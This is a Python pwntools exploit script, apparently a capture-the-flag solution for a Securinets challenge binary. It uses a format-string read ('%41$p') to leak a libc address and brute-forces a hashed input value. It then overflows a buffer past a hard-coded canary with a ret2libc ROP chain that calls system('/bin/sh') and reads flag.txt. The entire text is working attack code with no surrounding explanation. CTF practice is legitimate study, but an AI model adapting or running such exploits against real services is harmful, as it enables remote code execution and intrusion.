#!/usr/bin/env python3
from pwn import *

context.binary = ELF("./main", checksec=False)
context.log_level = "error"
libc = ELF("./libc.so.6", checksec=False)


def route_tag(number):
    number ^= number >> 16
    number = number * 0x7feb352d & 0xffffffff
    number ^= number >> 15
    number = number * 0x846ca68b & 0xffffffff
    number ^= number >> 16
    return number


frequency = 0
while route_tag(frequency) != 0x30db734f:
    frequency += 1

canary = b"jiggly!!"
route = f"{frequency} %41$p".encode()

p = process("./main") if args.LOCAL else remote("127.0.0.1", 9015)

p.sendlineafter(b"> ", route)
p.recvuntil(b"ENCRYPTED ROUTE ECHO:\n")
puts = int(p.recvline().split()[-1], 16)
libc.address = puts - libc.sym["puts"]

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
ret = rop.find_gadget(["ret"]).address
bin_sh = next(libc.search(b"/bin/sh\0"))

payload = flat(
    b"A" * 16,
    canary,
    b"B" * 16,
    pop_rdi,
    bin_sh,
    ret,
    libc.sym["system"],
)

p.sendlineafter(b"> ", payload)
sleep(0.2)
p.sendline(b"cat flag.txt")
p.recvuntil(b"Securinets{")
flag = b"Securinets{" + p.recvuntil(b"}")
print(flag.decode())
p.close()
